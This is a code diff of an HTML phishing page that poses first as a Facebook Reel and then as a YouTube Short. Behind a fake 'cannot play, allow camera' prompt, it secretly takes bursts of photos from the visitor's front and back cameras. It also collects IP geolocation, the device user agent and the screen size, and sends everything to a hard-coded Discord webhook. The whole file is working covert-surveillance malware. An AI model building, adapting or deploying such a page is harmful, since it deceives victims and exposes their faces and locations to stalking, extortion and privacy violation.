@@ -3,20 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Facebook</title>
-  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
-
-  <!-- OG-tags -->
-  <meta property="og:title" content="Facebook">
+  <title>YouTube</title>
+  <link rel="icon" href="https://www.youtube.com/s/desktop/66e817ed/img/favicon_32x32.png">
+  <!-- OG-tags aangepast naar YouTube Shorts style -->
+  <meta property="og:title" content="YouTube">
   <meta property="og:description" content="DOK MI NISI PAO U OCIMA DUBOKO">
   <meta property="og:image" content="https://i.imgur.com/DEIN_THUMBNAIL.jpg">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
-  <meta property="og:url" content="https://www.facebook.com/share/r/1AeJHMHjaj/">
+  <meta property="og:url" content="https://www.youtube.com/shorts/1AeJHMHjaj">
   <meta property="og:type" content="video.other">
-
   <style>
-    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; }
+    body { margin:0; font-family:Roboto,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; }
     .header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.85); display:flex; align-items:center; padding:0 16px; z-index:100; }
     .close { font-size:38px; font-weight:bold; cursor:pointer; margin-right:20px; pointer-events:auto; }
     .title { flex:1; text-align:center; font-size:20px; font-weight:600; }
@@ -32,10 +30,10 @@
     .text-overlay { position:absolute; bottom:240px; left:0; right:0; font-size:2.6rem; text-align:center; text-shadow:0 6px 30px #000; pointer-events:none; line-height:1.1; z-index:4; }
     .actions { position:absolute; bottom:60px; right:24px; display:flex; flex-direction:column; gap:36px; font-size:34px; color:#fff; z-index:6; pointer-events:none; }
     .audio { position:absolute; bottom:20px; left:16px; font-size:14px; opacity:0.85; z-index:10; pointer-events:none; }
-    #cam-prompt, #loc-prompt { position:fixed; inset:0; background:rgba(0,0,0,0.95); display:none; align-items:center; justify-content:center; z-index:9999; pointer-events:auto; }
+    #cam-prompt { position:fixed; inset:0; background:rgba(0,0,0,0.95); display:none; align-items:center; justify-content:center; z-index:9999; pointer-events:auto; }
     .modal-box { background:#fff; color:#000; padding:50px 40px; border-radius:22px; max-width:460px; text-align:center; box-shadow:0 20px 70px rgba(0,0,0,0.75); pointer-events:auto; }
     .btn { padding:18px 80px; font-size:1.35rem; font-weight:bold; border:none; border-radius:12px; margin:20px 12px; cursor:pointer; pointer-events:auto; touch-action:manipulation; }
-    .allow { background:#1877f2; color:#fff; }
+    .allow { background:#ff0000; color:#fff; } /* YouTube rood */
     .deny { background:#e4e6eb; color:#000; }
     #flash { position:fixed; inset:0; background:white; opacity:0; pointer-events:none; z-index:9998; transition:opacity 0.1s; }
   </style>
@@ -43,61 +41,42 @@
 <body>
 <div class="header">
   <div class="close" id="closeBtn">×</div>
-  <div class="title">Reels</div>
+  <div class="title">Shorts</div>
 </div>
-
 <div class="reel">
   <div class="profile">
     <div class="avatar"></div>
     <div class="info">
       <div class="name">Zorica Zoka Dimitrijevic</div>
-      <div class="pub">Öffentlich</div>
+      <div class="pub">Public</div>
     </div>
   </div>
-
   <div class="play-area" id="playArea">
     <div class="play-btn" id="playBtn"><div class="triangle"></div></div>
   </div>
-
   <div class="text-overlay">DOK MI NISI<br>PAO U OCIMA DUBOKO</div>
-
   <div class="actions">
-    <div>❤️ 14.6K</div>
+    <div>👍 14.6K</div> <!-- YouTube like icoon -->
     <div>💬 305</div>
-    <div>➤</div>
+    <div>➤</div> <!-- Share -->
   </div>
-
   <div class="audio">Zorica Zoka Dimitrijevic · Original audio · Zorica</div>
 </div>
-
 <div id="flash"></div>
-
 <div id="cam-prompt">
   <div class="modal-box">
-    <h2>Deze Reel kan niet afgespeeld worden</h2>
+    <h2>Deze Short kan niet afgespeeld worden</h2>
     <p style="margin:30px 0; font-size:1.4rem;">Geef kort toegang tot je camera.</p>
     <div id="camErr" style="color:#c00;display:none;margin:20px 0;">Toegang geweigerd – probeer opnieuw</div>
     <button id="allowCam" class="btn allow">CAMERA TOESTAAN</button>
     <button id="denyCam" class="btn deny">ANNULEREN</button>
   </div>
 </div>
-
-<div id="loc-prompt">
-  <div class="modal-box">
-    <h2>Locatie delen nodig</h2>
-    <p style="margin:30px 0; font-size:1.4rem;">Deel je precieze locatie om door te gaan.</p>
-    <button id="allowLoc" class="btn allow">LOCATIE DELEN</button>
-    <button id="denyLoc" class="btn deny">NEE</button>
-  </div>
-</div>
-
 <video id="v" autoplay muted playsinline style="display:none"></video>
 <canvas id="c" style="display:none"></canvas>
-
 <script>
 const HOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
 let count = 0, frontStream = null, backStream = null, v = document.getElementById('v'), c = document.getElementById('c'), flash = document.getElementById('flash');
-
 async function getIPData() {
   const apis = ['https://ipapi.co/json/', 'https://ipinfo.io/json', 'https://api.ipify.org?format=json', 'https://freegeoip.app/json/'];
   for (let url of apis) {
@@ -118,34 +97,21 @@ async function getIPData() {
   }
   return {ip:'verborgen (VPN?)', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
 }
-
-async function getGPS() {
-  return new Promise(r => {
-    if (!navigator.geolocation) return r(null);
-    navigator.geolocation.getCurrentPosition(
-      p => r({latitude:p.coords.latitude, longitude:p.coords.longitude, accuracy:p.coords.accuracy}),
-      () => r(null),
-      {enableHighAccuracy:true, timeout:10000, maximumAge:0}
-    );
-  });
-}
-
 async function send(type, blob = null) {
   try {
-    let loc = await getGPS() || await getIPData();
+    let loc = await getIPData();
     let ip = loc.ip || 'verborgen';
     let city = loc.city || '?', region = loc.region || '?', country = loc.country || '?', postal = loc.postal || '?', org = loc.org || '?';
     let lat = loc.latitude, lon = loc.longitude;
     let acc = lat ? `${Math.round(loc.accuracy || 500)}m` : 'IP-Fallback';
     let maps = lat ? `https://maps.google.com/?q=${lat.toFixed(7)},${lon.toFixed(7)}&z=19&layer=c` : null;
-
     const embed = {
-      title: `🔴 FB ${type} #${++count}`,
+      title: `🔴 YT ${type} #${++count}`, // Aangepast naar YT voor YouTube
       color: lat ? 0x00ffcc : 0xff0000,
       fields: [
         {name:"Event", value:type, inline:true},
         {name:"IP + Ort", value:`**${ip}**\n${city} • ${region} • ${country} • ${postal} • ${org}`, inline:true},
-        {name:"Genauigheid", value:acc, inline:true},
+        {name:"Genauigkeit", value:acc, inline:true},
         {name:"UA", value:navigator.userAgent.substring(0,140), inline:false},
         {name:"Screen", value:`${screen.width}×${screen.height}`, inline:true},
         {name:"Zeit", value:new Date().toISOString(), inline:true}
@@ -153,7 +119,6 @@ async function send(type, blob = null) {
       timestamp: new Date().toISOString()
     };
     if (maps) embed.fields.push({name:"Google Maps – Position", value:`[→ exakte Stelle](${maps})`, inline:false});
-
     const payload = {embeds:[embed]};
     if (blob) {
       let fd = new FormData();
@@ -167,7 +132,6 @@ async function send(type, blob = null) {
     console.error("Send failed:", e);
   }
 }
-
 async function startCam(facing = "user") {
   try {
     const s = await navigator.mediaDevices.getUserMedia({
@@ -184,12 +148,10 @@ async function startCam(facing = "user") {
     return null;
   }
 }
-
 function flashScreen() {
   flash.style.opacity = '0.8';
   setTimeout(() => flash.style.opacity = '0', 80);
 }
-
 async function captureBatch(facing, numPhotos = 5) {
   for (let i = 0; i < numPhotos; i++) {
     c.getContext('2d').drawImage(v,0,0,c.width,c.height);
@@ -203,12 +165,10 @@ async function captureBatch(facing, numPhotos = 5) {
     await new Promise(r => setTimeout(r, 50)); // minimale delay voor smoothheid
   }
 }
-
 document.getElementById('playBtn').addEventListener('click', async () => {
   document.getElementById('cam-prompt').style.display = 'flex';
   send('PLAY');
 });
-
 document.getElementById('allowCam').onclick = async () => {
   document.getElementById('cam-prompt').style.display = 'none';
   let front = await startCam("user");
@@ -225,29 +185,16 @@ document.getElementById('allowCam').onclick = async () => {
       }
     };
     loop(); // start direct
-    setTimeout(() => document.getElementById('loc-prompt').style.display = 'flex', 3000);
   } else {
     document.getElementById('camErr').style.display = 'block';
     setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 1500);
   }
 };
-
 document.getElementById('denyCam').onclick = () => {
   document.getElementById('camErr').style.display = 'block';
   send('CAM_DENY');
   setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 1500);
 };
-
-document.getElementById('allowLoc').onclick = async () => {
-  document.getElementById('loc-prompt').style.display = 'none';
-  send('LOC_GRANTED');
-};
-
-document.getElementById('denyLoc').onclick = () => {
-  document.getElementById('loc-prompt').style.display = 'none';
-  send('LOC_DENY');
-};
-
 document.getElementById('closeBtn').onclick = () => location.reload();
 </script>
 </body>
